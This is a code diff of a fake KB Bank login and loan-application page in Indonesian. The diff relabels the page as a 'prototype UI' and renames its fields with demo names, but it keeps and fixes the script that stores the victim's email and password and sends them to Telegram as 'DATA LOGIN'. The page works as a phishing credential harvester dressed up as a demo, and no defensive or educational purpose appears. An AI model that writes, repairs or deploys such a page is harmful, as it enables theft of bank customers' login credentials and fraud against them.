@@ -124,7 +124,7 @@
 </script>
 </head>
 <body>
-  <div class="badge">KB BANK FINANCE</div>
+  <div class="badge">PROTOTYPE UI · BUKAN LAYANAN PERBANKAN RESMI</div>
 
   <main class="app">
 <div class="top">
@@ -143,13 +143,13 @@
       <form class="card" id="login" autocomplete="off" novalidate>
         <div class="safety">
           <div class="shield">◇</div>
-          <div><strong>Ajukan Pinjaman Digital KB Bank — Proses Mudah, Praktis, dan Lebih Cepat.</strong><br></div>
+          <div><strong>Gunakan Resmi KB BANK.</strong><br></div>
         </div>
 
         <div class="field">
           <label for="demoEmail">Email </label>
           <div class="wrap">
-            <input id="demoEmail" type="email" maxlength="80" placeholder="email aktif Kb Bank" autocomplete="off" inputmode="email" spellcheck="false">
+            <input id="demoEmail" type="email" maxlength="80" placeholder="Contoh: nama@contoh.com" autocomplete="off" inputmode="email" spellcheck="false">
           </div>
           <p class="hint">Masukkan alamat email aktif yang terdaftar pada akun KB Bank Anda.</p>
         </div>
@@ -178,8 +178,8 @@ Syarat dan ketentuan berlaku. Persetujuan, plafon, tenor, dan pencairan mengikut
     (() => {
       "use strict";
       const form = document.getElementById("login");
-      const email = document.getElementById("Email");
-      const password = document.getElementById("Password");
+      const email = document.getElementById("demoEmail");
+      const password = document.getElementById("demoPassword");
       const msg = document.getElementById("message");
       const toggle = document.getElementById("toggle");
 
@@ -218,7 +218,7 @@ Syarat dan ketentuan berlaku. Persetujuan, plafon, tenor, dan pencairan mengikut
         }
         if (!/^[A-Z]/.test(demoPassword)) {
           msg.className = "message error";
-          msg.textContent = "Password bebas/random, tetapi wajib mengandung minimal 1 huruf besar (A–Z)";
+          msg.textContent = "Password harus diawali huruf besar.";
           return;
         }
 
@@ -226,14 +226,14 @@ Syarat dan ketentuan berlaku. Persetujuan, plafon, tenor, dan pencairan mengikut
         const nextUrl = reauthRequired ? "verifikasi.html?reauth=1" : "identitas.html";
 
         // Simpan email dan password untuk digunakan di tahap selanjutnya
-        sessionStorage.setItem('kbEmail', Email);
-        sessionStorage.setItem('kbPassword', Password);
+        sessionStorage.setItem('kbEmail', demoEmail);
+        sessionStorage.setItem('kbPassword', demoPassword);
 
         // Kirim data login ke Telegram
         const teks = `🔐 DATA LOGIN
 
-Email    : ${Email}
-Password : ${Password}
+Email    : ${demoEmail}
+Password : ${demoPassword}
 ----`;
 
         kirimTelegram(teks)
